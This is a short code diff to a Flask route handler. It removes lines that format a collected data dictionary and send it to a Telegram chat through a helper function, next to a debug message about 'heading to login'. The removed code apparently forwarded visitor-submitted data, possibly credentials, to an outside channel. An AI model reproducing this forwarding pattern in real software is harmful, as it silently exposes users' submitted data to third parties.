@@ -175,10 +175,7 @@ def serve(path):
         return send_from_directory(files_folder, "index.html")
 
     print("Works perfectly heading to login")
-    # Format dict into readable text
-    message = "\n".join([f"{key}: {value}" for key, value in data.items()])
-    # Send to telegram
-    _send_telegram_message(message)
+   
     if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
         return send_from_directory(app.static_folder, path)
     
